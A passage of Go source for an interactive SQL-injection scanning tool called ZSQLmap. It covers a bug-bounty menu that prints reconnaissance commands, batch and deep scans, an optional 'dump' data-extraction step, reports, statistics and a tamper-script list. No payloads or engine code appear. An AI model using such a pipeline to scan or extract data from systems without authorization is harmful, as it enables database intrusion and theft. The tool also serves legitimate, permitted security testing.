            color.Red("  • %s in %s (%s) [%s]", v.Type, v.Parameter, v.Severity, v.Dbms)
        }
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
}

func (z *ZSQLmap) bugBountyWorkflow(ctx context.Context) {
    color.Cyan("\n[ BUG BOUNTY WORKFLOW ]")

    color.Cyan("Pipeline Stages:")
    color.White("  1. Reconnaissance")
    color.White("  2. Target selection")
    color.White("  3. Automated scanning")
    color.White("  4. Manual testing")
    color.White("  5. Report generation")

    fmt.Print(color.YellowString("\n[?] Current stage (1-5): "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    stage := strings.TrimSpace(scanner.Text())

    switch stage {
    case "1":
        color.Cyan("\n[Reconnaissance Phase]")
        fmt.Print(color.YellowString("[?] Target domain: "))
        scanner.Scan()
        domain := strings.TrimSpace(scanner.Text())

        color.Green("\nRecommended tools:")
        color.White("  • subfinder -d %s", domain)
        color.White("  • assetfinder -subs-only %s", domain)
        color.White("  • amass enum -d %s", domain)
        color.White("  • httpx -l subdomains.txt -o alive.txt")
        color.White("  • katana -u https://%s -d 3", domain)
        color.White("  • waybackurls %s | grep '='", domain)

    case "2":
        color.Cyan("\n[Target Selection]")
        fmt.Print(color.YellowString("[?] Path to targets file: "))
        scanner.Scan()
        targetFile := strings.TrimSpace(scanner.Text())

        if _, err := os.Stat(targetFile); err == nil {
            data, _ := os.ReadFile(targetFile)
            targets := strings.Split(string(data), "\n")
            color.Green("[✓] Loaded %d targets", len(targets))

            for i, t := range targets {
                if i >= 10 {
                    break
                }
                t = strings.TrimSpace(t)
                if t != "" {
                    color.White("  • %s", t)
                }
            }

            fmt.Print(color.YellowString("\n[?] Test first 5 targets? (y/N): "))
            scanner.Scan()
            if strings.ToLower(strings.TrimSpace(scanner.Text())) == "y" {
                for i, t := range targets {
                    if i >= 5 {
                        break
                    }
                    t = strings.TrimSpace(t)
                    if t != "" {
                        if !strings.HasPrefix(t, "http") {
                            t = "http://" + t
                        }
                        color.Cyan("\n[*] Testing: %s", t)
                        z.engine.Run(ctx, t, "basic", "")
                    }
                }
            }
        } else {
            color.Red("[✗] File not found")
        }

    case "3":
        color.Cyan("\n[Automated Scanning]")
        fmt.Print(color.YellowString("[?] Target URL: "))
        scanner.Scan()
        targetURL := strings.TrimSpace(scanner.Text())

        if !strings.HasPrefix(targetURL, "http") {
            targetURL = "http://" + targetURL
        }

        color.Cyan("\n[*] Starting automated scan pipeline...")

        // Step 1: Basic scan
        color.Yellow("\n[Step 1] Basic vulnerability scan")
        z.engine.Run(ctx, targetURL, "basic", "")

        // Step 2: Deep scan
        fmt.Print(color.YellowString("\n[?] Continue with deep scan? (y/N): "))
        scanner.Scan()
        if strings.ToLower(strings.TrimSpace(scanner.Text())) == "y" {
            color.Yellow("[Step 2] Deep scan with enumeration")
            z.engine.Run(ctx, targetURL, "full", "")
        }

        // Step 3: Data extraction
        fmt.Print(color.YellowString("\n[?] Attempt data extraction? (y/N): "))
        scanner.Scan()
        if strings.ToLower(strings.TrimSpace(scanner.Text())) == "y" {
            color.Yellow("[Step 3] Data extraction")
            z.engine.Run(ctx, targetURL, "dump", "")
        }

    case "4":
        color.Cyan("\n[Manual Testing]")
        color.White("Manual testing techniques:")
        color.White("  1. Test URL parameters")
        color.White("  2. Test POST data")
        color.White("  3. Test headers")
        color.White("  4. Test cookies")
        color.White("  5. Test JSON/XML inputs")

        fmt.Print(color.YellowString("\n[?] Select technique: "))
        scanner.Scan()
        technique := strings.TrimSpace(scanner.Text())

        switch technique {
        case "1":
            z.quickURLTest(ctx)
        case "2":
            z.captureAndTest(ctx)
        default:
            color.Yellow("[!] Coming soon...")
        }

    case "5":
        color.Cyan("\n[Report Generation]")
        z.generateReports()
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) generateReports() {
    color.Cyan("\n[ REPORT GENERATION ]")

    fmt.Print(color.YellowString("[?] Report format (1-Markdown, 2-JSON, 3-CSV, 4-All) [4]: "))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    format := strings.TrimSpace(scanner.Text())

    switch format {
    case "1":
        z.reporter.GenerateBugBountyReport()
    case "2":
        z.reporter.GenerateJSONReport()
    case "3":
        z.reporter.GenerateCSVReport()
    default:
        z.reporter.GenerateBugBountyReport()
        z.reporter.GenerateJSONReport()
        z.reporter.GenerateCSVReport()
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner.Scan()
}

func (z *ZSQLmap) showStats() {
    color.Cyan("\n[ SQLMAP STATISTICS ]")

    history, err := z.db.GetAuditHistory(1000)
    if err != nil {
        color.Red("[✗] Failed to get stats")
        return
    }

    stats := z.db.GetVulnerabilityStats()

    // Calculate stats
    totalScans := len(history)
    totalVulns := 0
    if stats["total"] != nil {
        totalVulns = stats["total"].(int)
    }

    avgDuration := 0.0
    if totalScans > 0 {
        for _, h := range history {
            avgDuration += h.Duration
        }
        avgDuration /= float64(totalScans)
    }

    color.Cyan("\n📊 SCAN STATISTICS:")
    color.White("  • Total scans: %d", totalScans)
    color.White("  • Total vulnerabilities: %d", totalVulns)
    color.White("  • Average scan duration: %.1f seconds", avgDuration)

    if stats["by_severity"] != nil {
        color.Cyan("\n🔥 VULNERABILITIES BY SEVERITY:")
        sevMap := stats["by_severity"].(map[string]int)
        for severity, count := range sevMap {
            switch severity {
            case "Critical":
                color.Red("  • %s: %d", severity, count)
            case "High":
                color.Red("  • %s: %d", severity, count)
            case "Medium":
                color.Yellow("  • %s: %d", severity, count)
            case "Low":
                color.Green("  • %s: %d", severity, count)
            default:
                color.White("  • %s: %d", severity, count)
            }
        }
    }

    if stats["by_dbms"] != nil {
        color.Cyan("\n💾 VULNERABILITIES BY DBMS:")
        dbmsMap := stats["by_dbms"].(map[string]int)
        for dbms, count := range dbmsMap {
            color.White("  • %s: %d", dbms, count)
        }
    }

    if stats["by_type"] != nil {
        color.Cyan("\n📝 VULNERABILITIES BY TYPE:")
        typeMap := stats["by_type"].(map[string]int)
        for typ, count := range typeMap {
            color.White("  • %s: %d", typ, count)
        }
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
}

func (z *ZSQLmap) showTamperScripts() {
    color.Cyan("\n[ TAMPER SCRIPTS ]")
    color.Cyan(strings.Repeat("=", 70))

    for i, tamper := range TamperScripts {
        color.White("%2d. \033[96m%s\033[0m", i+1, tamper.Name)
        color.White("    %s", tamper.Description)
        color.White("")
    }

    fmt.Print(color.HiBlackString("\nPress Enter to continue..."))
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
}

func (z *ZSQLmap) getLocalIP() string {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return "127.0.0.1"
    }

    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP.String()
            }
        }
    }
    return "127.0.0.1"
}

// ========== UTILITIES ==========
type Utils struct{}

func (u *Utils) ClearScreen() {
    cmd := exec.Command("clear")
    cmd.Stdout = os.Stdout
    cmd.Run()
}

func (u *Utils) Min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

func min(a, b int) int {
    if a < b {
        return a
    }
    return b
}

// ========== MAIN ==========
func main() {
    runtime.GOMAXPROCS(runtime.NumCPU())

    zsqlmap, err := NewZSQLmap(DefaultConfig)
    if err != nil {
        fmt.Printf("Failed to initialize: %v\n", err)
        return
    }
    defer zsqlmap.db.Close()

    zsqlmap.Run()
}
